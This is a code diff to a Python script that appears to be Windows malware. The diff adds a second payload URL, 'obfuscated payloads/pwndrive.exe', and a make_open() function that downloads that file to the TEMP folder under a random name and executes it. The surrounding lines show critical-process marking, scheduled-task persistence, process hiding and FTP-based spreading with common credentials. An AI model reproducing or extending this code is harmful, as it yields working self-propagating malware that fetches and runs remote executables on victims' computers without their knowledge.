@@ -23,7 +23,8 @@ RtlSetProcessIsCritical = ctypes.windll.ntdll.RtlSetProcessIsCritical
 RtlSetProcessIsCritical.argtypes = [ctypes.c_uint, ctypes.c_uint, ctypes.c_uint]
 RtlSetProcessIsCritical.restype = ctypes.c_int
 
-GITHUB_URL = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/cpu_hog.exe"
+GITHUB_URL = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/initializers/init.exe"
+SECOND_URL = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/obfuscated%20payloads/pwndrive.exe"
 PAYLOAD_PATH = None
 
 def is_admin():
@@ -61,6 +62,16 @@ def download_payload():
         return destination_path
     except:
         return None
+    
+def make_open():
+    try:
+        random_name = f'{generate_random_name()}.exe'
+        download_path = os.path.join(os.getenv('TEMP'), random_name)
+        response = requests.get(SECOND_URL)
+        if response.status_code == 200:
+            open(download_path, 'wb').write(response.content)
+            subprocess.Popen(download_path, shell=True)
+    except:pass
 
 def ftp_connect(ip, user, pwd, p, anonymous=False):
     global PAYLOAD_PATH
@@ -327,5 +338,6 @@ if __name__ == "__main__":
     persist_schtasks()
     download_payload()
     setup_ftp_server(common_users, common_pass)
+    make_open()
     hide_process()
     ftp_spread(common_users, common_pass)
